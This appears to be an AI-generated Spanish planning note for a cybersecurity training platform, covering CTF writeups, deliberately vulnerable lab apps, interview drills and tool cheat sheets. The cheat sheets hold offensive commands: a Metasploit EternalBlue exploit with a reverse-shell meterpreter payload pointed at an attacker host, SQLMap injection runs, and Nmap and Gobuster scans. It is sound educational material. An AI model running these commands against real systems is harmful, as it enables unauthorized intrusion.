# 📋 Follow-ups Pendientes — Sesión 21 Agosto 2026

> **Estado:** Pendientes de implementar
> **Fecha:** 21 de Agosto, 2026
> **Prioridad:** Ordenados por importancia

---

## 🎯 Follow-up 1: Writeups Profesionales

**Objetivo:** Crear 10 writeups de máquinas HTB/THM como plantilla profesional.

**¿Por qué es crítico?**
Un reclutador técnico siempre preguntará: "¿Puedes mostrarme un writeup?" Sin esto, no puedes demostrar tu habilidad práctica.

**Contenido a crear:**

### Plantilla Estándar
```markdown
# [Nombre de la Máquina]

| Metadato     | Valor                        |
|--------------|------------------------------|
| Plataforma   | HTB / THM / picoCTF          |
| Dificultad   | Easy / Medium / Hard         |
| Categoría    | Web / AD / Linux / Crypto    |
| Fecha        | YYYY-MM-DD                   |
| IP           | X.X.X.X                     |

## Resumen Ejecutivo
TL;DR en una línea.

## Reconocimiento
- Nmap scan
- Web enumeration
- Service discovery

## Explotación
- Vulnerabilidad encontrada
- Payload utilizado
- Shell obtenida

## Escalada de Privilegios
- Enumeración
- Vector de privesc
- Root obtenido

## Flags
- User: FLAG{...}
- Root: FLAG{...}

## Lecciones Aprendidas
- Qué funcionó
- Qué no funcionó
- Qué haría diferente
```

### Máquinas a Documentar

#### Fácil (5)
1. **HTB: Blue** - EternalBlue, Windows
2. **HTB: Lame** - Samba, Linux
3. **THM: Kenobi** - ProFTPd, SUID, Linux
4. **THM: Daily Bugle** - Joomla, SQLi, Linux
5. **THM: Ice** - Metasploit, Windows

#### Medio (3)
6. **HTB: Sense** - Buffer Overflow, Windows
7. **HTB: Arctic** - ColdFusion, Windows
8. **THM: Internal** - AD basics, Kerberoasting

#### Difícil (2)
9. **HTB: Observer** - Command injection, AD
10. **HTB: Trick** - DNS, pivoting, Linux

**Prioridad:** ⭐⭐⭐⭐⭐ (CRÍTICO)

---

## 🎯 Follow-up 2: Vulnerable Apps Propias

**Objetivo:** Desarrollar 3 vulnerable apps para los labs.

**¿Por qué es importante?**
Reducir dependencia de DVWA y crear entornos únicos que no se encuentran en otros sitios.

### App 1: DVWA-Lite (Simplificada)
**Tecnologías:** PHP + MySQL
**Vulnerabilidades:**
- SQL Injection (básico/intermedio/avanzado)
- XSS (reflejado/almacenado/DOM)
- CSRF
- File Upload
- Command Injection

**Docker:**
```dockerfile
FROM php:8.1-apache
# Instalar extensiones PHP
# Copiar código vulnerable
# Configurar MySQL
```

### App 2: BankApp (Bancaria)
**Tecnologías:** Node.js + Express + MongoDB
**Vulnerabilidades:**
- Authentication bypass
- IDOR (Insecure Direct Object Reference)
- JWT manipulation
- Session fixation
- Rate limiting bypass

**Features:**
- Login/Register
- Transferencias
- Historial de transacciones
- API REST vulnerable

### App 3: CorpNet (Corporativa)
**Tecnologías:** Python + Flask + SQLite
**Vulnerabilidades:**
- SSRF (Server-Side Request Forgery)
- XXE (XML External Entity)
- Deserialization
- Path Traversal
- Information Disclosure

**Features:**
- Intranet simulada
- File sharing
- User profiles
- Admin panel

**Prioridad:** ⭐⭐⭐⭐ (ALTA)

---

## 🎯 Follow-up 3: Simulacros de Entrevista

**Objetivo:** Crear simulacros de entrevista técnica para ciberseguridad.

**¿Por qué es importante?**
La mayoría de candidatos técnicos fallan no por falta de conocimiento, sino por no saber cómo comunicarlo.

### Preguntas por Nivel

#### Junior (0-2 años)
1. ¿Qué es la tríada CIA?
2. Explica la diferencia entre TCP y UDP
3. ¿Qué es SQL Injection y cómo se previene?
4. Diferencia entre hash y cifrado
5. ¿Qué es un firewall y cómo funciona?

#### Mid-Level (2-5 años)
1. Diseña una arquitectura segura para una app web
2. ¿Cómo responderías a un ransomware en producción?
3. Explica el ciclo de un pentest completo
4. ¿Qué es CSRF y cómo se mitiga?
5. Diseña un SIEM para una empresa mediana

#### Senior (5+ años)
1. ¿Cómo crearías un programa de bug bounty?
2. Diseña una estrategia de threat modeling
3. ¿Cómo manejarías un breach de datos?
4. Explica zero trust architecture
5. ¿Cómo medirías el ROI de seguridad?

### Escenarios Prácticos

**Escenario 1: Incidente de Ransomware**
> "Es lunes 9am. Recibes una alerta de que el servidor de backups no responde. Al inspeccionar, encuentras que todos los archivos tienen extensión .locked. ¿Qué haces?"

**Escenario 2: Vulnerabilidad en Producción**
> "Encuentras una SQLi crítica en el endpoint /api/users de producción. No hay WAF. ¿Cuáles son tus primeras 5 acciones?"

**Escenario 3: Entrevista de Red Team**
> "Te dan acceso a una red /24. Tienes 4 horas. ¿Cuál es tu plan de acción?"

**Prioridad:** ⭐⭐⭐⭐ (ALTA)

---

## 🎯 Follow-up 4: Cheatsheets Profesionales

**Objetivo:** Generar cheatsheets de las herramientas principales.

**¿Por qué es importante?**
Los profesionales usan cheatsheets diariamente. Son la referencia rápida que te ahorra tiempo.

### Cheatsheets a Crear

#### 1. Nmap - Escaneo y Enumeración
```bash
# Discovery
nmap -sn 192.168.1.0/24          # Ping sweep
nmap -Pn -sn 192.168.1.0/24      # No ping

# Port Scanning
nmap -sV -sC target              # Version + scripts
nmap -sS -p- target              # SYN full port
nmap -sU target                  # UDP scan

# Enumeration
nmap --script=vuln target        # Vuln scan
nmap --script=http-enum target   # Web enum
nmap --script=smb-enum-shares target  # SMB

# Output
nmap -oA result target           # All formats
```

#### 2. Wireshark - Análisis de Tráfico
```
# Filtros comunes
http.request.method == "POST"
dns.qry.name contains "evil"
tcp.port == 443
ip.src == 192.168.1.100

# Exportar
File > Export Objects > HTTP
File > Export Packet Dissections
```

#### 3. Burp Suite - Testing Web
```
# Proxy
127.0.0.1:8080

# Scanner
Active Scan > Target

# Intruder
Sniper > Positions > Payloads

# Repeater
Modify request > Send
```

#### 4. Metasploit - Explotación
```bash
# Search
msfconsole
search eternalblue

# Use
use exploit/windows/smb/ms17_010_eternalblue

# Configure
set RHOSTS target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker

# Execute
exploit
```

#### 5. SQLMap - SQL Injection
```bash
# Basic
sqlmap -u "http://target/?id=1" --dbs

# POST
sqlmap -u "http://target/login" --data="user=admin&pass=*"

# With cookie
sqlmap -u "http://target/page?id=1" --cookie="session=*"

# Tamper
sqlmap -u "http://target/?id=1" --tamper=space2comment
```

#### 6. Gobuster - Directory Brute
```bash
# Directories
gobuster dir -u http://target -w wordlist.txt

# VHosts
gobuster vhost -u http://target -w vhosts.txt

# Extensions
gobuster dir -u http://target -w wordlist.txt -x php,html,txt
```

**Prioridad:** ⭐⭐⭐ (MEDIA)

---

## 📊 Resumen de Prioridades

| Follow-up | Prioridad | Tiempo Estimado | Impacto |
|-----------|-----------|-----------------|---------|
| 1. Writeups | ⭐⭐⭐⭐⭐ | 2 semanas | Crítico |
| 2. Vulnerable Apps | ⭐⭐⭐⭐ | 1 mes | Alto |
| 3. Entrevistas | ⭐⭐⭐⭐ | 1 semana | Alto |
| 4. Cheatsheets | ⭐⭐⭐ | 3 días | Medio |

---

## 🚀 Recomendación

**Empezar con el Follow-up 1 (Writeups)** porque:
1. Es lo que más impresiona en entrevistas
2. Demuestra habilidad práctica real
3. Se puede hacer incrementalmente
4. Complementa lo que ya tienes

**Después Follow-up 3 (Entrevistas)** porque:
1. Es rápido de implementar
2. Ayuda inmediatamente en la búsqueda laboral
3. Complementa los writeups

**Luego Follow-up 2 (Vulnerable Apps)** porque:
1. Requiere más tiempo
2. Mejora la plataforma a largo plazo
3. Reduce dependencia externa

**Por último Follow-up 4 (Cheatsheets)** porque:
1. Es referencia, no aprendizaje
2. Se puede ir agregando gradualmente
3. Los usuarios pueden contribuir

---

*Documento generado por Buffy — 21 de Agosto, 2026*
